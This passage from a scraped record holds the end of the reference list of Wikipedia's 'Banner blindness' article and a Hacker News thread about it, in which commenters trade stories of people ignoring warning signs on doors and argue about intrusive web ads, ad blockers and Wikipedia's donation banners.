doi:10.3145/epi.2014.may.08. ^ Kindermann, H. (2016, July). A Short-Term Twofold Impact on Banner Ads. In International Conference on HCI in Business, Government and Organizations(pp. 417-426). Springer International Publishing. ^ a b Idemudia, E. C., & Jones, D. R. (2015). An empirical investigation of online banner ads in online market places: the cognitive factors that influence intention to click. International Journal of Information Systems and Management, 1(3), 264-293. ^ Robinson, H., Wysocka, A., & Hand, C. (2007). Internet advertising effectiveness: the effect of design on click-through rates for banner ads.International Journal of Advertising, 26(4), 527-541. ^ Porta, M., Ravarelli, A., & Spaghi, F. (2013). Online newspapers and ad banners: an eye-tracking study on the effects of congruity. Online Information Review, 37(3), 405-423. ^ Higgins, E., Leinenger, M., & Rayner, K. (2014). Eye movements when viewing advertisements. Frontiers in Psychology, 5. ^ Hervet, G., Guérard, K., Tremblay, S., & Chtourou, M. S. (2011). Is banner blindness genuine? Eye tracking internet text advertising. Applied cognitive psychology, 25(5), 708-716. ^ a b c Resnick, M., & Albert, W. (2014). The impact of advertising location and user task on the emergence of banner ad blindness: An eye-tracking study. International Journal of Human-Computer Interaction, 30(3), 206-219. ^ Goldstein, D. G., Suri, S., McAfee, R. P., Ekstrand-Abueg, M., & Diaz, F. (2014). The economic and cognitive costs of annoying display advertisements. Journal of Marketing Research, 51(6), 742-752. ^ Jay, C., Brown, A., & Harper, S. (2013). Predicting whether users view dynamic content on the world wide web. ACM Transactions on Computer-Human Interaction (TOCHI), 20(2), 9. ^ Lee, J.; Ahn, J. H.; Park, B. (2015). \"The effect of repetition in Internet banner ads and the moderating role of animation\". Computers in Human Behavior. 46: 202–209. doi:10.1016/j.chb.2015.01.008 ^ a b O'Donnell, Katie; Cramer, Henriette (May 2015). \"People's Perceptions of Personalized Ads\". WWW '15 Companion. International Conference on World Wide Web. Association for Computing Machinery. pp. 1293–1298. doi:10.1145/2740908.2742003. ^ a b Bang, H., & Wojdynski, B. W. (2016). Tracking users' visual attention and responses to personalized advertising based on task cognitive demand.Computers in Human Behavior, 55, 867-876. ^ Koster, M.; Ruth, M.; Hambork, K. C.; Kaspar, K. C. (2015). \"Effects of Personalized Banner Ads on Visual Attention and Recognition Memory\". Applied Cognitive Psychology. 29 (2): 181–192. doi:10.1002/acp.3080. ^ \"Online Consumers Fed Up with Irrelevant Content on Favorite Websites, According to Janrain StudyJanrain\". Janrain. Retrieved 2016-11-07. ^ \"Banner Blindness, Viewability, Ad Blockers and Other Ad Optimization Tricks\". Business 2 Community. Retrieved 2016-11-07. ^ Margarida Barreto, A. (2013). Do users look at banner ads on Facebook?. Journal of Research in Interactive Marketing, 7(2), 119-139. Retrieved from \"https://en.wikipedia.org/w/index.php?title=Banner_blindness&oldid=1187566653\" Categories: Usability Advertising Attention Hidden categories: Articles with short description Short description matches Wikidata Pages displaying short descriptions of redirect targets via Module:Annotated link",
    "commentLink": "https://news.ycombinator.com/item?id=39867632",
    "commentBody": "Banner blindness (wikipedia.org)118 points by yamrzou 15 hours agohidepastfavorite97 comments saghm 14 hours agoI feel like a similar thing happens in \"real life\" sometimes, not just on websites. Back in high school, I used to volunteer at an animal shelter, and we had an area out back where we'd walk the dogs or let them run around in one of a few fenced in areas throughout the day so they could go to the bathroom and get some exercise. The door leading out here was located in one of the rooms with dog kennels, so people coming to potentially adopt a dog would walk through this room a lot, and often they'd try to walk out back and watch or participate with the volunteers and staff taking some of the dogs out. We'd ask them politely to go back inside because they aren't allowed out there and point out the very large sign in large font on the door saying this, and every time they'd always act very surprised because they claimed not to have seen it. I'm sure some people were just feigning ignorance because it seemed easier, but the sheer number of people claiming it makes it believable that at least _some_ of them genuinely didn't notice; they saw a door, they wanted to go through, and they opened it without processing the words right in front of their face. reply petsfed 13 hours agoparentThere are situations where its hard to understand how even the non-verbal warnings didn't latch though. There's \"no unauthorized personnel\", and then there's \"Fire door, alarm will sound\". In college, i worked at a university recreation center, and the desk I worked at was about 15 feet from a fire door. It sat somewhat between the weight room and the men's locker room, so virtually all male customers walked past this specific, well marked, fire door during their visit. And about 2-3 times a week, while I was working, somebody would finish up their workout and just push that door open and walk out. And every time, they'd look thunderstruck that the alarm did in fact sound. I eventually dropped all pretense of understanding that they were on autopilot, and began commenting as I deactivated and reactivated the alarm AGAIN \"I thought universities required students be able to read\". Only one person ever got short with me over that, and all I had to do was point at the letters that were bigger than their head, directly at eye level, 18 inches from their face, while they pushed the door open. reply Terr_ 12 hours agorootparent> \"Fire door, alarm will sound\". IMO those doors shouldn't just have a sign-sticker slapped on them, there ought to be something visually (and tactilely) different about the push-bar itself. P S.: For example, a wavy bar, or a bunch of distinctly raised bumps on the surface in strong contrasting color like high-vis yellow with reflectivity. Since this is for an indoor surface nobody should be touching, that means durability isn't a big issue: Just stick some adhesive blister-chunks onto whichever push-bar happens to need the warning, and then scrape them off if the situation changes. reply Too 55 minutes agorootparentBreak glass works if sign discovery was the only issue. Many times (especially students), they simply don’t care. Replace the glass and the next day it’s broken anyway. The only solution I’ve seen that works against that is covering the door handle in super sticky ball bearing grease. reply codazoda 11 hours agorootparentprevMany of these, however, should just be doors. For many of them the alarming of them seems unnecessary. reply petsfed 11 hours agorootparentprevThe whole reason that I had keys to enable/disable the alarm was specifically because the Outdoor Program that I worked at needed to load in/out large equipment (think canoes, bikes, sleds, etc) that was ungainly to move through the locker room. This was also the primary avenue for moving e.g. weight room equipment in and out of the facility. So while it didn't get used a lot for non-emergency use, it got used often enough that non-durable controls would degrade much too quickly. reply Cthulhu_ 10 hours agorootparentprevAnother option in use around here require the user to break glass before being able to use the door; as with fire alarms, having to break something has been proven extremely effective in deterring misuse, accidental or unintentional use of things like fire exits. reply pigpang 27 minutes agorootparentRed scotch tape over door handle is much easier to apply or replace. reply Terr_ 10 hours agorootparentprevOften emergency doors need to open in situations like dim lighting and a crush/stampede of people behind you, which makes it hard to create a safe implementation for whoever happens to be at the front. In the safest implementations, the person doesn't even need to know they are about to break something by pushing the bar... But puts us back at square one except with more maintenance headaches. reply avidiax 10 hours agorootparentprevJust coat the bar in anti-climb paint. https://en.m.wikipedia.org/wiki/Anti-climb_paint reply Terr_ 10 hours agorootparentBut what if an actual emergency occurs? People still need to be able to reliably grip and manipulate the door bar/plates/handles, you can't just make them super slippery all the time. reply avidiax 5 hours agorootparentThe ones in the US are simply a crash bar. I suppose you could argue that someone might choose to burn instead of getting grease on their hands, but that sounds unlikely. reply interestica 8 hours agorootparentprev> \"I thought universities required students be able to read\" Clearly there was a UX/Design issue with the door. A person approaching a door is already thinking about what's on the other side. Maybe the warning needs to be before the door. Or maybe there needs to be a different design to the door. I'd guess that the door looks like every other door they encounter on campus. reply 082349872349872 1 hour agorootparentIf only we could get people to agree on standards, it'd be easy to believe (for large facilities at least) one might have something like: unpainted - (or beige, etc.) this is a normal door red - don't use this door blue - use *this* door reply scotty79 2 hours agorootparentprevSomething like those \"wet floor\" signs on the floor in front of the door. Easy to remove intentionally. Hard to get around accidentally. reply nkrisc 11 hours agorootparentprevIf it looks like a regular door, people will open it. If it is not a regular door, it should not look like one. reply Cthulhu_ 10 hours agorootparentOr it should require an unusual and awkward action to open, like having to reach up and break something: https://cdn-01.media-brady.com/store/stuk/media/catalog/prod... reply permo-w 11 hours agorootparentprev>I eventually dropped all pretense of understanding that they were on autopilot, and began commenting as I deactivated and reactivated the alarm AGAIN \"I thought universities required students be able to read\". this is an odd sentiment. so what, you were originally pretending to give them the benefit of the doubt, but then you just gave up? so your original thought was that they were doing it on purpose for some reason? why on earth would they do that? reply petsfed 11 hours agorootparentI started out giving people (the perps were uniformly male) the benefit of the doubt, but my patience wore thin with how frequently it happened, and finally I started explicitly calling people out. I suppose, I should've phrased it as \"I eventually dropped even the pretense of understanding...\" >why on earth would they do that? Why on earth would a 19 year old male, who has never been away from home before, has likely never seen any real consequences for their behavior before, read a sign that warns them of said consequences, and still decide that those consequences are less bad than walking an extra 100 feet through a locker room? I assume the same reason that similarly aged college males removed all of the fluorescent light tubes from the hallways of their own dorm. Or the same reason at least one of the shower drains in the dorm's men's communal bathroom was plugged with paper towels every month. reply maxcoder4 11 hours agorootparentThey were obviously on autopilot. People are sometimes tired, may be going through a lot, think about something else at the moment, and just don't read every sign on every doors they find. You sound a bit bitter here. I know I am friendly distracted and made many similar mistakes in my life - but never intentionally. reply petsfed 10 hours agorootparentAutopilot makes sense when that door is usually open, usually available, but today for some reason its closed, and that's unusual. This door was closed and alarmed year-round, for decades, until the building was renovated and that particular exit was removed entirely. If its a new student, I get it, and I was rarely salty about people making that mistake early in a semester (It happened so frequently in September that my boss would occasionally leave the alarm off until the end of his workday for the whole month). If this was still happening in April (and it did), when that student has realistically been going past that door and through the locker room since at least January, and more likely since August, its not \"autopilot\". reply TeMPOraL 3 hours agorootparent> Autopilot makes sense when that door is usually open, usually available, but today for some reason its closed, and that's unusual. This door was closed and alarmed year-round, for decades, until the building was renovated and that particular exit was removed entirely. A door in a position that invites to be opened, that makes it convenient for egress, is a door that almost always can be used for that purpose. That it's closed is irrelevant - almost all doors are almost always closed all the time; it's very unusual these days to spot doors that are even ajar, much less fully opened. This is the default mode; for doors that beg to be used for exit to be unusuable for it, armed with alarm and/or annoyed staff member, that is unusual. reply permo-w 10 hours agorootparentprevsounds like theres a healthy dose of sexism at play here. reply petsfed 5 hours agorootparentIt does look like that, and certainly, that may have been an additional factor, but the main issue is that this exit was the one closest to student housing (dorms and fraternity/sororities) and also to the men's locker room. It was very rare that folks would go out the fire door by the women's locker room, but it wasn't really adjacent to where the newest students would be. To be clear, I identify as male, and have done so my whole life. So this wasn't like \"young college male sees a woman to antagonize\" or \"college female sees sexism everywhere\", so much as \"young college male somehow believes that 'alarm will sound' is just a bluff\". Whether or not that's biological in nature, or just the way 19 year old men circa 2006 were socialized, I won't speculate. But I never saw a woman open that door. reply sandspar 2 hours agorootparentYou seem all twisted in knots. reply bongodongobob 10 hours agorootparentprevNo, there are very real differences between genders. You can pretend there isn't for Internet Points, but you're just wrong. reply permo-w 10 hours agorootparentthere's a gulf between \"there are no differences between genders\" and mass generalisation based on emotional reaction, and for me this flies a lot closer to the second one reply petsfed 5 hours agorootparentI'm not gonna speculate about whether its biological or something to do with how 19 year old men ca 2006 had been socialized up to that point. All I'm saying is that it happened dozens of times, and it was never a woman who pushed that door open. reply joebob42 4 hours agorootparentYou already gave an explanation before that had nothing to do with any difference in gendered behavior (it was next to the men's locker room), which makes it even more baffling that you're now suggesting that no, it really was because men were less capable of not opening the door. reply bongodongobob 9 hours agorootparentprevSo you haven't been in a college dorm then. reply bongodongobob 10 hours agorootparentprevAre you kidding me? 18 and 19 year old males are like the highest risk taking, complete fuckery, \"hold my beer bro\", push the limits demographic by a long shit. reply permo-w 10 hours agorootparenttrue, but that doesn't mean that's what was happening. did you read the article? reply QuantumYeti 12 hours agorootparentprevSounds like you were upset that you had a job looking at a door, and took it out on people. reply ethanbond 12 hours agorootparentIt’s totally reasonable to scold people for using emergency exits (especially alarmed ones) without an emergency need. It also doesn’t make you a bad person or stupid to subconsciously miss signage. But you should be okay with a bit of scolding in that case. reply TeMPOraL 12 hours agorootparentIs there even a reason for an emergency exit to not be treated as a regular, auxiliary exit? I.e. not labeled as regular, but also not an issue if people use it. reply Terr_ 11 hours agorootparent> Is there even a reason for an emergency exit to not be treated as a regular, auxiliary exit? Absolutely, ex: 1. When that exit may be used as an entrance to a prohibited or fee-only area. Someone inside opens the latch for people waiting outside, either intentionally or accidentally, allowing them to enter without being noticed. 2. To supplement other things which may trigger an alarm, or for situations that can't be detected in a simple standard automated way. (E.g. violence, unusual chemical spill, wild animal.) It also means you don't need to plant as many alarm-panels around the place which panicked people are unlikely to use on their way out anyway. reply kelnos 11 hours agorootparentprevThe reason is often the opposite: you don't want people coming in that door (maybe it's a limited-access building and you don't want to staff security/ID checker at more locations). Sure, you can lock it from the outside, but if people are regularly leaving from that door, randos outside are going to sneak in before the door shuts. reply petsfed 11 hours agorootparentprevIf the facility has any need to control access, they need to be more aggressive than just one way doors, since fire-code compliant one-way doors are trivially defeated with a doorstop. reply QuantumYeti 12 hours agorootparentprevIt's not reasonable to scold strangers, especially if you're just some random employee. reply MrVandemar 11 hours agorootparentIf you're an employee, and a member of the public is in your workplace, then you have a reasonable expectation that they will behave according to the rules of that workplace. Often these rules are for safety, and for sure it is absolutely reasonable to scold strangers if they have zero situational awareness. I work in a medical practice. We have an expectation that people will obey rules for their and our protection. For example: we had a sign that, at our reception desk, that people should stay behind a line and not approach too close. There was a thick, clearly visible tape line on the floor. There was a two large signs on reception desk asking patients to stay behind the line. This is during the heightened awareness of the pandemic. People were asked to change their behavior in many ways. Patients would just come up to the reception desk and lean over the desk. Damn right I \"scolded\" them for it. I mean, I didn't roast them, but I used a tone of voice, and asked them to step away from the desk, and pointed out the signs. Some of them were cranky about doing so ... when SARS was rampant! reply vermilingua 12 hours agorootparentprevYes, it absolutely is reasonable to scold strangers for things like this, especially if you’re an employee who sees it happening regularly. reply permo-w 11 hours agorootparentscolding is broadly something you do to someone you see as beneath you. if you feel the need to scold strangers, you've probably got other issues reply petsfed 11 hours agorootparentSo if one of your peers pulls a fire alarm or blasts an air horn in your work place, while you're on a call or engaged in some other highly focused task, the appropriate response is to just shrug and think \"I need to be such a highly emotionally controlled person that I can only passively deactivate the alarm, contact an authority who won't even be here before the culprit leaves and just move on with my day\"? Fine, I didn't \"scold\" this person, I called out a peer for their shitty, antisocial behavior. Or is holding someone accountable even in words for the painful consequences of their decisions unacceptable too? reply permo-w 10 hours agorootparent>So if one of your peers pulls a fire alarm or blasts an air horn in your work place, while you're on a call or engaged in some other highly focused task, the appropriate response is to just shrug and think \"I need to be such a highly emotionally controlled person that I can only passively deactivate the alarm, contact an authority who won't even be here before the culprit leaves and just move on with my day\"? why are the two options angrily telling someone off or silently and submissively accepting the situation? the way mature adults react to interpersonal trouble is by quelling instinctive emotions and calmly communicating reply petsfed 5 hours agorootparentI didn't light into him like a drill sergeant. And I didn't go off on every person who walked through that door. I just turned off my customer-service obsequiousness for once and directly stated (without yelling) what I thought: that his only mitigation, that it was an innocent mistake, reveals that he has absolutely no business attending a university. But apparently, my comment (just checked, I never even used the word \"scold\") suggests to you that I must have been shouting him down, calling him a lazy, stupid asshole, for not walking the extra 100 feet through the correct exit, like everyone else had been doing, for months. Lord knows a part of me wanted to, but I am not the unhinged psychopath you clearly think I am. reply kelnos 11 hours agorootparentprevI think you have a definition for \"scolding\" outside the mainstream. You scold someone who has done something wrong and should know better. There need not be any judgment about the person's worth attached. reply permo-w 10 hours agorootparentthe definition of scolding is \"angrily rebuking or reprimanding someone\". in my understanding of human psychology, that is something people do not do to people they see as equals. more specifically it's a behaviour a person is extremely unlikely to participate in if they feel the other person has enough social, physical or economic capital to punish them for it. reply matheusmoreira 8 hours agorootparentI see your point and you're definitely right about that. If you're going to publicly scold someone in front of their peers, you better be ready because it's going to personally insult them in very deep ways, to say nothing of their social standing. If you're scolding someone you should probably be a badass drill sergeant, literally made of muscle, many times their superior in rank and with enough balls and testosterone to unblinkingly look them in the eye while heaping abuse right at their faces without one shred of hesitation, so that the sheer audacity of it all shocks and intimidates them into total submission. And you would also do well to remember that at least one movie depicts exactly one such drill sergeant getting shot in the chest when a certain scoldee went postal over it. reply ethanbond 11 hours agorootparentprev“Just some random employee” as in… the person tasked with maintaining security and safety of the facility? reply petsfed 11 hours agorootparentprevI dunno how much time you've spent around fire alarms, but they're required to be painfully loud. Not \"permanent damage\" loud, but loud enough to trigger e.g. migraines in people who suffer from them. This door had a fire alarm on it. The university needed to control access to the facility through one secure checkpoint (that I had worked at in the past, but at this time no longer did so). They didn't want (for instance) random townies to be able to come and go via the side doors without filling out the relevant liability waivers, because it turns out screwing around in a weight room carries some risk. To say nothing of the consequences of some rando wandering in off the street and posting up in the locker room. I was answering phone calls, helping people rent outdoor equipment. My job was not at all watching the door. But I had to deal with 19 year olds who (and I did watch this a couple times) would look directly at the sign, pause to read it, push the door open, then have an utterly shocked expression that the PAINFULLY LOUD alarm was going off. And I'd have to drop whatever I was doing, go turn off the alarm, then recompose and return to the customer that I was helping. Please explain to me what is so objectionable about a school controlling access to its facilities. reply matheusmoreira 9 hours agorootparentprev> Fire door, alarm will sound Honestly it's a little ambiguous and confusing. When will the alarm sound? \"When there's a fire\" is the immediate answer that comes to my mind. Doors don't generally trip loud alarms when you open them. Not once in my life have I ever come across such a door. The idea is pretty foreign to me. Wouldn't be surprised if others were equally confused. You were familiar with that particular door and its alarm-tripping nature, others probably weren't. \"Alarm will sound if opened\" might have reduced such incidents. reply bagels 14 hours agoparentprevThere are so many signs that everyone encounters everyday that are of no consequence. Everyone develops the habit of not reading them. reply pixl97 12 hours agorootparentAdblock for the brain. This is the problem with advertisements. The vie so hard for your attention they really are hard to ignore. But after they catch your attention you've realized that your attention has just been wasted. Soon you catch yourself just filtering out anything that could potentially be an ad. reply Sharlin 13 hours agoparentprevAll of us act, much of the time, on varying degrees of autopilot. It's unlikely that the automatic parts of the brain can read, although presumably they are quite capable of pattern-recognizing and processing learned symbolic language like traffic signs (and even that's by no means guaranteed – so many humans merrily ignore or miss changes in signage in traffic, having traveled the same route a thousand times before). The strength and type of stimulus required to \"wake us up\" – for the brain to realize there's something novel or unexpected that requires the activation of higher-level, analytic parts of the brain – probably varies a lot from person to person, but just a bunch of text is not always enough to do that unless accompanied by familiar semiotic language, which is of course the reason we use symbols and colors to make important messages more likely to be perceived and understood. The best wake-up signals are, of course, those that physically prevent you from doing something you intended to do – a locked door, for example. reply saghm 10 hours agorootparentUnfortunately with up to a few dozen dogs needing to go outside multiple times a day and a half dozen volunteers that are only on shifts for a few hours at a time, there were just too many different people needing to go through that door too often for it to be worth locking it and distributing keys to everyone. Maybe having the door locked and the key hanging right next to it would be enough for people to disengage autopilot, but I'm not convinced that non-volunteers wouldn't just grab the key and open the door sometimes as well. Plus, some of the dogs could be quite strong, and the volunteers ranged from teenagers to retirees, so having both hands on the leash and being able to just push the door open was preferable in a lot of circumstances. reply ben_w 12 hours agoparentprevI once visited a sword shop, and only noticed the signs tiled every metre horizontally and vertically across the walls saying \"do not touch\" when the person I was with told me about them as my fingers hovered mere centimetres from one of the wall-mounted blades. I also didn't notice the moonwalking gorilla in the famous video clip despite being aware in advance that there would be one. reply breischl 14 hours agoparentprevDefinitely a thing. Just yesterday I was annoyed by my auto mechanic's credit card fee, and said they should've told me up front. She pointed out it was on a sign on the counter that I was looking at that moment, and had also been there when I dropped the car off the day before. reply neon5077 12 hours agoparentprevIn the early days of the pandemic, the retail chain I worked for had a curbside delivery only policy. No customers in the store period, you had to call us and we'd bring your whatever out to you. No amount of signage on the door would stop people walking in. I stacked a bunch of boxes physically blocking the door and people still forced their way in. The only thing that worked was putting a strip of blue painter's tape across the doorway directly at eye level. I have long since stopped trying to make sense of other people's behavior. reply bagels 11 hours agorootparentA bunch of stacked boxes are really ambiguous. Did someone stack them there on accident, or as a prank? reply geor9e 9 hours agoparentprevSounds like a UIUX problem. Sign makers get about half a second to convince a rushed person to pause, between the moment the sign enters their field of view and the moment they're already through the door. If the sign is anything more than a large red STOP symbol and anything more than the words NOT AN EXIT and/or AUTHORIZED PERSONNEL ONLY, then I bet most people don't read it. I probably wouldn't, unless I was incredibly bored. Most signs are irrelevant to most readers and we are constantly inundated with them on every door and every hallway wall we walk down. If it was important it would follow internally recognized danger signage UIUX standards. Which usually just means a big symbol. Everything else is just another blurry bakesale announcement that flashed past our face. reply josefresco 13 hours agoparentprev> feigning ignorance We have our hourly rate printed on a sign in our conference room. The walls are very clean, with almost no other signage. Despite communicating my rate to a client (via email) and having two meetings in this room, this particular client was shocked when they received my final bill which (again) stated our rate. I believe in this case they were just unhappy and looking for an \"emotional plea\" way out of payment. reply D-Coder 11 hours agoparentprevNotAlwaysRight.com has tons of stories about people who ignored signs, closed doors, locked doors etc. reply pflenker 2 hours agoprevI once was a product manager for an app which included an inbox (mostly for promotional stuff). That app also included banner ads here and there. Consistent feedback from our users was that they missed that there was a new unread item in said inbox. About half a year after I started managing that product I decided to fix this, seemed like an easy win. The inbox was a bit hidden, so a red dot on its icon wasn’t going to cut it - so I sat down with one of the devs to brainstorm for a quick solution. „What do you mean“, he said. „It’s already there!“ And he pointed at something at the front page of the app. And sure enough: it was an area highlighted in yellow, saying something along the lines of „you have x items in your inbox“. I swear I have not seen it before. It didn’t even look like an ad, but it used similar attention-grabbing mechanisms as an ad, which was probably why everyone filtered it out. Turned out it was a manager decision: partners had complained that people missed out on their valuable promos in the inbox, and the boss decided a big box right at the front and center of the app would fix it. He then sent screenshots to partners and their complaints stopped. Ironically we never fully fixed this, as the boss thought that it was already prominent enough and feared that changing it would mean partners would complain again. reply karaterobot 14 hours agoprev> A higher than expected number of advertisements may cause a user to view the page as cluttered.[7] The number of adverts and annoyances on a webpage contribute to this perception of clutter.[6] As users can concentrate on only one stimulus at a time, having too many objects in their field of vision causes them to lose focus.[8] This contributes to behaviors such as ad avoidance or banner blindness. I have done a pretty good job filtering out advertisements and other annoying web crap, and if anything ever sneaks through I notice it immediately. Whatever the opposite of banner blindness is, that's what I exhibit. Banner hypersensitivity? reply dhosek 14 hours agoparentSometimes banner blindness becomes total blindness: https://bsky.app/profile/dahosek.bsky.social/post/3kop4ci756... reply andai 13 hours agorootparentHey, once you accept cookies, a full 50% of vertical height becomes available for reading. reply malfist 13 hours agorootparentprevI don't get how companies, who's only product is content, get their content to be so....distastefully full of ads. reply kjkjadksj 13 hours agorootparentThe content is not the product just like how the chum a fisherman tosses is not the product. The product is the customer base and they make money selling access to it for advertising. reply TeMPOraL 13 hours agorootparentExactly. That's the truth of modern Internet - including social media: content is not the product, it's bait. reply Nextgrid 12 hours agorootparentI'd argue that with so many KPIs based around \"engagement\", it's not just social media but software in general. reply ben_w 12 hours agorootparentprevThis makes me feel worse about LLMs… reply matheusmoreira 10 hours agorootparentprev> I don't get how companies Then let's philosophize at length about it. I'm about to write a borderline religious text on the matter. > who's only product is content This is the reason why you could not understand. The content is not the product. It's actually you personally. You are the product. Your attention, your memory, your cognitive functions, your behavior. They forcibly take those from you without your consent, without warning. Then they sell it off to the highest bidder. That is their product, their business model, the way they make money. Industrial scale violation of people's minds. Industrial scale mind rape. Content? It's just bait designed to attract you. The content is completely irrelevant to them. Just a means to an end. Only reason there's any content at all is you wouldn't visit the website otherwise. To them content is nothing but a cost they'd very much enjoy not having to pay. A cost center that they're only too happily outsourcing to generative AI. Even the word \"content\" is a problem. It's industry jargon but I view it as something of an euphemism. This so called \"content\" is nothing but a generic replaceable square around which the ads agglutinate like parasites. The web today is mostly garbage because of all this industrial scale \"content\" being produced. Nobody has anything real to say, it's just \"content\" they produce by the truckloads in order to attract people to sites so they can sell out their audience's minds to the corporations. There ought to be a better name for it. \"Slop\" comes to mind. Yeah, slop sounds good. All this slop isn't real human creation, it's just an undesirable industrial byproduct of the modern web. People create slop in order to attract audiences so they can sell them out to the advertisers. When you see HN users complaining about how shitty the Google search results are, they're complaining about the ever increasing density of worthless slop they're running into when they search for literally anything. People are actually paying for search engines whose entire business model is filtering out the slop and presenting to their users the sites which are actually worth visiting. Hell, this is why people come to HN to begin with. There's a refreshingly small amount of slop on this site. On HN you find real people writing real thoughts. People who work at billion dollar companies, people who created programming languages and operating systems that others use, people who thought up the algorithms you learn about in books, a disproportionate number of them come here in order to comment on things. Sometimes they tell incredible stories. Those comments are more valuable than the articles being commented on. This is what slop isn't: real human culture. Maybe the advertisers just haven't found out about HN yet. Not too long ago, there was a story here about Google bumping HN up in search results. That bit of news actually made me scared for the future. What's more sinister though is the fact advertisers have literal censorship power over the web. You'll never see a text such as this comment posted on an ad-supported website. The fact is if it offends the advertisers it doesn't get published at all. Because if you publish it, they cut you off from your advertising money. Therefore the advertisers own the creators and control their creative processes. I've seen such cutoffs happen, it's downright pathetic. Watching good people bend down to the likes of Google because someone with money was offended at their brand being associated with something they didn't like even though they literally paid for it. I watched people scramble to unpublish, to delete, to destroy their own creations just to appease the almighty advertisers. It seriously made me sick. > distastefully full of ads It's made to be that way. It's carefully tuned via unethical human experimentation (\"A/B testing\") to make it as profitable as possible but just tolerable enough that you won't leave or do something about it. They employ talented programmers to design algorithms to automatically figure out your limits and push you right up to those limits. Use uBlock Origin. It's essentially legitimate self-defense at this point. Self-defense for our minds. Don't try to pay them off, that just proves you have disposable income to spend on products you don't need, driving up the value of your attention even further. You're essentially paying for the privilege of segmenting yourself into the upper echelons of their markets. At some point, some shareholder value maximizing CEO will come along, notice the vast piles of money being left on the table and then promptly sell out the audience so as to avoid leaving money on the table. Betrayal is virtually guaranteed. Don't empathize with them. Just laugh when they call you entitled, when they call you a thief. Nobody in this world is more entitled than an advertiser. They think they are entitled to your attention. They think they can sell your attention to corporations. The mere fact they even think your attention is theirs to sell to begin with just invalidates anything they could possibly say in their defense. You'll watch them defend nonsense such as \"intellectual property\" even though they constantly violate your right to privacy by collecting vast amounts of personal information about you, information that really ought to belong to you by all reasonable standards. Just use uBlock Origin. Delete their noise without a second thought. On sight. Don't lose a second of sleep over it. Don't feel an ounce of guilt. Ads are nothing but noise. To be filtered. reply tempodox 2 hours agorootparentAnd lest we forget, the internet didn't invent this business model. Most of the literal newspapers that existed before operated the same way. Except they didn't have uBlock Origin. And if Google wins, ad blocking will again be removed from the only browser remaining, which will be Chrome. reply TeMPOraL 49 minutes agorootparentThere's the matter of degree though. Dose makes the poison, and so even the nastiest substances like botox can be used for good, if applied in minuscule amounts. This may be me looking at history through rose-colored glasses, but I feel that the degree of loathing and contempt that a typical business has towards its customers, justifying ever increasing abuse, is a recent phenomenon. Like, newspapers and magazines of yore at least tried - there were comptetent authors writing for quality, and all kinds of ads funding it. The past decade or two? The content is now of negative intellectual value to the reader, and nobody gives a fuck. reply jollyllama 13 hours agorootparentprevYes, this is the chosen \"solution\" to banner blindness reply CoffeeTails 14 hours agoparentprevSame here. Some pages are, for me, unusable without blocking all ads and banners. Especially if they move or have bright colors! reply thih9 12 hours agoparentprevWhat do you use? Does this approach work both on desktop or mobile? reply YoshiRulz 11 hours agorootparentuBlock Origin has been available on Android Firefox for years. reply euroderf 2 hours agoprevReading the daily (paper!) newspaper as a kid, I trained my brain to skip large ads entirely. Only rarely did I have a double-take. The same skills have transfered to digital media. Banner ads and sidebar ads simply do not exist. Unfortunately... pop-up ads defeat this. reply kaycebasques 13 hours agoprevThis can be a GOTCHA in docs site UX. A lot of docs sites use admonitions (e.g. [1]) to call special attention to a particular piece of info and, ironically, the admonition might make readers less likely to see the info. [1] https://docusaurus.io/docs/markdown-features/admonitions reply hinkley 12 hours agoparentI ran into this about 8 years ago. I was using a new dev tool, and the docs said there was a UI element to do something. I looked, and looked and just could find what they were talking about. So I contacted them to ask what the deal was, and they sent me a screen grab. Turns out what I was looking for was in a weird rectangle embedded halfway down the page and centered on the 3rd quartile of the width of the page. Exactly where someone would stick an ad into an HTML page. They had put a box around it and styled it a little differently, so my brain tuned it right out. reply drexlspivey 13 hours agoprevMy favorite example of this https://ux.stackexchange.com/questions/120541/why-do-people-... reply omoikane 12 hours agoprev> Users dislike animated ads This section cites a few sources from ~10 years ago, but we still see those annoying video ads pop up in random places in 2024. I wonder if those ads were actually bought by competing companies with the intent to bring negative attitudes toward whatever is being advertised. reply rhdunn 48 minutes agoparentAs a personal anectote, I find anything that moves in my periferal vision to be distracting. Therefore, if there are any animations that occur without me initiating them on a second monitor, I find those distracting. That includes animated gifs, videos, ads, etc. on pages I have open as reference material. They need a way of pausing, stopping, or hiding the animation if it lasts more than 5 seconds to comply with accessibility guidelines [1]. [1] https://www.w3.org/WAI/WCAG21/Understanding/pause-stop-hide.... reply user- 13 hours agoprevThey should include a blurb about Wikipedia's donation requests reply gunshai 13 hours agoparentI thought that's what the article was going to be about tbh. reply ot 13 hours agoprevSurprised that neither the article or this thread link to https://xkcd.com/570/ reply bibliotekka 10 hours agoparent> Title text: Somewhere out there is a company that has actually figured out how to enlarge penises, and it's helpless to reach potential customers. reply paganel 13 hours agoprevI’m exactly like that, this is why I can browse the web with no ad-blocker installed with almost no issue, by default I just ignore all banners. Curiously enough the same thing does not happen when watching regular TV programs. I’ve stopped watching regular TV almost 4 years ago, and that’s why when I happen to visit some of my friends who have the TV on I’m always surprised whenever ads interrupt whatever is being shown, I can’t understand how come people can put up with that. I guess they formed “TV ad blindness” reply andai 13 hours agoparentI think the difference is that you can't ignore an ad when it comes on, because the thing you were watching goes away. Whereas even on the worst websites you can just scroll or click the X and get back to what you were doing. reply quercusa 13 hours agoprevProp 65 has entered the chat... reply bdcravens 12 hours agoprevI wish the image in the article was a screenshot of Wikipedia begging for donations. https://en.wikipedia.org/wiki/File:Fundraising_banner.jpeg reply permo-w 11 hours agoparentwhy wish? make it so reply whamlastxmas 11 hours agorootparentTo be fair the existing image is a really good example reply reidjs 15 hours agoprevThat article will be very meta next time Jimmy Wales' face is plastered over the page asking for wikipedia donations. reply andai 13 hours agoparentThat might be why his face is there. Surely that counteracts banner blindness (at least partially)? reply eastbound 13 hours agoprev [–] Wikipedia has had a banner for 20 of the last 20 years, claiming not to be able to pay hosting and management bills, while hosting and management represent about 1% of their global finances, while they have various endeavours like hiring paid rewriters to rewrite Wikipedia in various political ways. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Banner blindness, first termed in 1998, is when visitors ignore banner-like information on websites due to factors like clutter aversion and user familiarity with the site.",
      "User interaction with banner ads is heavily influenced by website familiarity, impacting views and clicks.",
      "Factors such as congruency, calls to action, animation, and personalization affect online ad effectiveness, with personalized ads garnering more attention but irrelevant ads causing frustration."
    ],
    "commentSummary": [
      "The forum discusses Banner Blindness, where people ignore warning signs, especially in emergencies, due to autopilot behavior or intentional rule-breaking.",
